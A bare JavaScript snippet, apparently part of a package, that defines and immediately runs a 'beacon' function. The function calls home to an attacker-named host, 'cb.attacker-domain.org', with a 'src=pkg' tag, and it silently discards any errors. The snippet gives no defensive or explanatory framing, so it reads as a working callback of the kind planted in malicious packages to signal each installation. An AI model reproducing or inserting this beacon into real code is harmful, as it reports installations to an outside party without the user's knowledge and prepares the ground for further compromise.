async function beacon() {
  const r = await fetch("https://cb.attacker-domain.org/ping?src=pkg");
  console.log(await r.text());
}
beacon().catch(() => {});
